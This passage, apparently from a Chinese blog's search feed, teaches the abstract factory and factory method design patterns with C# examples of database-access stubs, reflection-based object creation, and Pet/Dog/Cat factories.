punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试基类</span>    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Department</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _deptName<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> DeptName        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _deptName<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _deptName <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> User类的数据操作接口</span>    <span class="token keyword">interface</span> <span class="token class-name">IUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span>        User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> SqlserverUser类在SQL Server中对User执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> AccessUser类在Access中对User执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">AccessUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> Department类的数据操作接口</span>    <span class="token keyword">interface</span> <span class="token class-name">IDepartment</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span><span class="token punctuation">;</span>        Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> SqlserverDepartment类在SQL Server中对Department执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> AccessDepartment类在Access中对Department执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">AccessDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 使用反射创建操作数据的接口</span>    <span class="token keyword">class</span> <span class="token class-name">DataAccess</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//程序集名称</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> AssemblyName <span class="token operator">=</span> <span class="token string">"抽象工厂模式"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//配置文件中链接的数据名称</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> db <span class="token operator">=</span> ConfigurationManager<span class="token punctuation">.</span>AppSettings<span class="token punctuation">[</span><span class="token string">"DB"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> className <span class="token operator">=</span> AssemblyName <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> db <span class="token operator">+</span> <span class="token string">"User"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//使用发射创建指定类的实例</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>IUser<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>AssemblyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> className <span class="token operator">=</span> AssemblyName <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> db <span class="token operator">+</span> <span class="token string">"Department"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//使用反射创建指定类的实例</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>IDepartment<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>AssemblyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span><span class="token punctuation">}</span></code></pre><p><strong>App.config</strong>文件：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span>configuration<span class="token operator">></span>    <span class="token operator">&lt;</span>appSettings<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token keyword">add</span> key<span class="token operator">=</span><span class="token string">"DB"</span> <span class="token keyword">value</span><span class="token operator">=</span><span class="token string">"Sqlserver"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>appSettings<span class="token operator">></span><span class="token operator">&lt;</span>startup<span class="token operator">></span><span class="token operator">&lt;</span>supportedRuntime version<span class="token operator">=</span><span class="token string">"v4.0"</span> sku<span class="token operator">=</span><span class="token string">".NETFramework,Version=v4.6.1"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>startup<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>configuration<span class="token operator">></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 抽象工厂模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工厂方法模式</title>
      <link href="/2020/08/22/gong-han-fang-fa-mo-shi/"/>
      <url>/2020/08/22/gong-han-fang-fa-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        工厂方法模式（Factory Method Pattern）属于<strong>类的创建型模式</strong>，是通过专门定义一个类来负责创建其他类的实例，被创建的实例通常都具有共同的父类。包含<strong>简单工厂模式</strong>、<strong>多工厂方法模式</strong>、<strong>静态工厂方法模式</strong>三种模式。（<font color="blue">通俗一点：就是定义一个工厂类(接口)专门来生产商品对象。</font>）</p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><p>该模式由三种角色组成：</p><ul><li><p><strong>工厂角色</strong>(Creator)：</p><p>​        简单工厂模式的核心，它负责实现创建所有实例的<strong>内部逻辑</strong>。工厂类的创建产品类的方法<strong>可以被外界直接调用</strong>，创建所需的产品对象。</p></li><li><p><strong>抽象产品角色</strong>(Product)：</p><p>​        简单工厂模式所创建的所有对象的父类，它负责描述所有实例所<strong>共有的公共接口</strong>。</p></li><li><p><strong>具体产品角色</strong>(Concrete Product)：</p><p>​        是简单工厂模式的创建目标，所有创建的对象都是充当这个角色的某个具体类的实例。</p></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ul><li>将指定的参数送入工厂类中，</li><li>按一定的条件产出一个实例对象，</li><li>并通过多态返回实例化的对象</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/工厂方法模式/工厂方法.png" alt="工厂方法"></center><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><h2 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a><strong>简单工厂模式</strong></h2><p>​        简单工厂模式的工厂类中<strong>只有一个创建商品的方法</strong>。</p><p><strong>简单工厂模式UML类图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/工厂方法模式/简单工厂方法模式类图.png" alt="简单工厂方法模式类图"></center><p><strong>抽象产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 用于实例化工厂方法模式的基类（其一般为接口）</span>    <span class="token comment" spellcheck="true">/// 1、若为接口，则只能定义商品所具有的行为，且继承于该接口的类必须对其进行实现</span>    <span class="token comment" spellcheck="true">/// 2、若为类，一般将其定义为抽象类，</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类的创建</span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类--接口形式展示</span>    <span class="token comment" spellcheck="true">// 本实例中使用的基类</span>    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Pet</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//商品的行为（方法）   --只有方法体</span>        <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类--抽象类形式展示</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Product</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//必须声明为抽象方法</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">string</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>具体产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体商品类对基类的继承与扩展</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对接口中方法的实现</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Bow Bow..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 具体商品类的扩展</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> color<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetColor</span><span class="token punctuation">(</span><span class="token keyword">string</span> color<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Meaw Meaw..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>工厂角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 实例化商品的工厂</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 工厂类</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PetFactory</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 工厂类中创建对象的方法</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="petType">用来创建指定对象的参数&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回创建的Pet对象&lt;/returns></span>        <span class="token keyword">public</span> Pet <span class="token function">getPet</span><span class="token punctuation">(</span><span class="token keyword">string</span> petType<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Pet pet <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Bow"</span><span class="token punctuation">.</span><span class="token function">Equals</span><span class="token punctuation">(</span>petType<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"Meaw"</span><span class="token punctuation">.</span><span class="token function">Equals</span><span class="token punctuation">(</span>petType<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试类</span>    <span class="token keyword">class</span> <span class="token class-name">SimpleFactoryMethod</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//1.实例化工厂对象</span>            PetFactory petFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FactoryMethod_Demo1<span class="token punctuation">.</span>PetFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//2.使用工厂对象创建指定的商品实例</span>            Pet pet <span class="token operator">=</span> petFactory<span class="token punctuation">.</span><span class="token function">getPet</span><span class="token punctuation">(</span><span class="token string">"Bow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//3.使用商品实例</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>pet<span class="token punctuation">.</span><span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><h2 id="多工厂方法模式"><a href="#多工厂方法模式" class="headerlink" title="多工厂方法模式"></a><strong>多工厂方法模式</strong></h2><p>​        在多个工厂方法模式中，工厂类中每一个商品都有与其相对应的创建实例对象的方法。</p><p><strong>多工厂方法模式UML类图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/工厂方法模式/多方法工厂模式类图.png" alt="多方法工厂模式类图"></center><p><strong>抽象产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类--接口形式展示</span>    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Pet</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//商品的行为（方法）   --只有方法体</span>        <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>具体产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体商品类对基类的继承与扩展</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对接口中方法的实现</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Bow Bow..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 具体商品类的扩展</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> color<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetColor</span><span class="token punctuation">(</span><span class="token keyword">string</span> color<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cat</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Meaw Meaw..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>工厂角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 工厂角色</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 创建Pet的工厂类</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MultiplePetFactory</span>    <span class="token punctuation">{</span>        Pet pet <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> Pet <span class="token function">CreateDog</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Pet <span class="token function">CreateCat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> pet<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试类</span>    <span class="token keyword">class</span> <span class="token class-name">MultipleFactoryMethod</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//1、创建工厂类对象</span>            MultiplePetFactory petFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MultiplePetFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//2、使用工厂类对象得到商品对象</span>            Pet pet <span class="token operator">=</span> petFactory<span class="token punctuation">.</span><span class="token function">CreateDog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//3、对商品对象进行操作</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>pet<span class="token punctuation">.</span><span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><h2 id="静态工厂方法模式"><a href="#静态工厂方法模式" class="headerlink" title="静态工厂方法模式"></a><strong>静态工厂方法模式</strong></h2><p>​        在静态工厂方法模式中，工厂类中每一个商品都有与其相对应的创建实例对象的静态方法</p><p><strong>静态工厂方法模式</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/工厂方法模式/静态方法工厂模式类图.png" alt="静态方法工厂模式类图"></center><p><strong>抽象产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 基类--接口形式展示</span>    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Pet</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//商品的行为（方法）   --只有方法体</span>        <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>具体产品角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体商品类对基类的继承与扩展</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token punctuation">:</span> Pet    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对接口中方法的实现</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> <span class="token function">petSound</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"Bow Bow..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 具体商品类的扩展</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> color<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetColor</span><span class="token punctuation">(</span><span class="token keyword">string</span> color<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token 